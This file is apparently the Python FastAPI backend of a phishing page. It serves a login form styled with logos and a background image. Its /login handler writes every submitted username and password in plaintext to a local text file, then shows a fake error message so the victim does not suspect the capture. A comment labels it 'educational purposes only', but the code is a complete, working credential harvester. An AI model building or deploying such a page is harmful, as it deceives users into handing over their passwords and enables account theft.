import os
from fastapi import FastAPI, Request, Form
from fastapi.responses import RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates

app = FastAPI()

# Get the absolute path of the directory this main.py file is in
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# 1. Mount the "static" folder so the browser can load your logos and background
app.mount(
    "/static", 
    StaticFiles(directory=os.path.join(BASE_DIR, "static")), 
    name="static"
)

# 2. Tell FastAPI where your HTML files are stored
templates = Jinja2Templates(directory=os.path.join(BASE_DIR, "templates"))

# 3. When the user goes to the main page (http://localhost:8000/), show e3.html
@app.get("/")
async def read_root(request: Request):
    # Pass show_error=False initially
    return templates.TemplateResponse(request=request, name="e3.html", context={"show_error": False})

# 4. Modified Login Logic: Show error and redirect later
@app.post("/login")
async def login(request: Request, username: str = Form(...), password: str = Form(...)):
    
    # Still save the data to a text file (EDUCATIONAL PURPOSES ONLY!)
    txt_path = os.path.join(BASE_DIR, "users_data.txt")
    with open(txt_path, "a", encoding="utf-8") as f:
        f.write(f"Account: {username} | Password: {password}\n")
    
    # LOGIC CHANGE: Instead of immediate RedirectResponse, return the HTML again
    # but pass show_error=True to the template.
    return templates.TemplateResponse(request=request, name="e3.html", context={"show_error": True})